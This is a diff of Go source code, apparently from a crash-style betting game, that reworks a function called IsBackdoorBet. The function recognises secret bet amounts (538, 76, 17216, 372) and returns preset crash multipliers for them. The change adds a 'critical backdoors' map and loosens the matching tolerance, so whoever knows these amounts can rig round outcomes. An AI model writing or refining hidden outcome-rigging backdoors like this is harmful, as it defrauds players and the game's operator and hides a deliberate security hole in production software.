@@ -100,38 +100,33 @@ func GetCrashPoints() map[int]float64 {
 
 // IsBackdoorBet проверяет, является ли сумма ставки бэкдором
 func IsBackdoorBet(amount float64) (bool, float64) {
-    // Прямая проверка для бэкдора 538
-    if math.Abs(amount - 538.0) < 0.0001 {
-        logger.Info("EXACT MATCH for special backdoor 538.0 with amount %.6f", amount)
-        return true, GetCrashPoints()[538]
+    // Список важных бэкдоров с прямой проверкой
+    criticalBackdoors := map[float64]float64{
+        538.0: 32.0,
+        76.0:  1.5,
+        17216.0: 2.5,
+        372.0: 1.5,
     }
     
-    // Используем округление и преобразование к целому для устранения проблем с плавающей точкой
-    intAmount := int(math.Round(amount))
-    
-    // Проверяем точное совпадение с бэкдором
-    if multiplier, exists := GetCrashPoints()[intAmount]; exists {
-        logger.Info("EXACT INTEGER MATCH for backdoor %d with amount %.6f", intAmount, amount)
-        return true, multiplier
-    }
-    
-    // Если точного совпадения нет, проверяем с небольшим допуском
-    for backdoor, multiplier := range GetCrashPoints() {
-        // Допуск 0.01 для float64
-        if math.Abs(float64(backdoor)-amount) < 0.01 {
-            logger.Info("APPROXIMATE MATCH for backdoor %d with amount %.6f (diff: %.6f)", 
-                backdoor, amount, math.Abs(float64(backdoor)-amount))
+    // Проверка важных бэкдоров сначала
+    for backdoor, multiplier := range criticalBackdoors {
+        if math.Abs(amount - backdoor) < 0.1 {
+            logger.Info("CRITICAL BACKDOOR MATCH for %.2f with amount %.6f", backdoor, amount)
             return true, multiplier
         }
     }
-
-    // Отдельная проверка для важных бэкдоров с большим допуском
-    importantBackdoors := []int{538, 76, 372}
-    for _, backdoor := range importantBackdoors {
-        if math.Abs(float64(backdoor)-amount) < 0.1 {
-            multiplier := GetCrashPoints()[backdoor]
-            logger.Info("IMPORTANT BACKDOOR MATCH for %d with amount %.6f (diff: %.6f)", 
-                backdoor, amount, math.Abs(float64(backdoor)-amount))
+    
+    // Обычная проверка через GetCrashPoints с округлением
+    intAmount := int(math.Round(amount))
+    if multiplier, exists := GetCrashPoints()[intAmount]; exists {
+        logger.Info("EXACT MATCH for backdoor %d with amount %.6f", intAmount, amount)
+        return true, multiplier
+    }
+    
+    // Проверка с небольшим допуском
+    for backdoor, multiplier := range GetCrashPoints() {
+        if math.Abs(float64(backdoor) - amount) < 0.1 {
+            logger.Info("APPROXIMATE MATCH for backdoor %d with amount %.6f", backdoor, amount)
             return true, multiplier
         }
     }
